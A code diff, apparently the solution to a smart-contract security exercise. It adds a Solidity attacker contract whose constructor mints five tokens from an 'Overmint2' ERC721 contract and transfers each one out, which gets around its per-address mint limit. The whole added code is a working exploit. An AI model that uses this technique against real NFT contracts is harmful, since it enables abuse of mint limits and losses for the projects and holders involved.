@@ -18,3 +18,22 @@ contract Overmint2 is ERC721 {
         return balanceOf(msg.sender) == 5;
     }
 }
+
+contract Overmint2Attacker {
+    Overmint2 public victim;
+    address attacker;
+
+    constructor(address victimContract) {
+        victim = Overmint2(victimContract);
+        address attacker = msg.sender;
+
+        for (uint256 i = 1; i <= 5; ) {
+            victim.mint();
+            victim.transferFrom(address(this), msg.sender, i);
+
+            unchecked {
+                i++;
+            }
+        }
+    }
+}
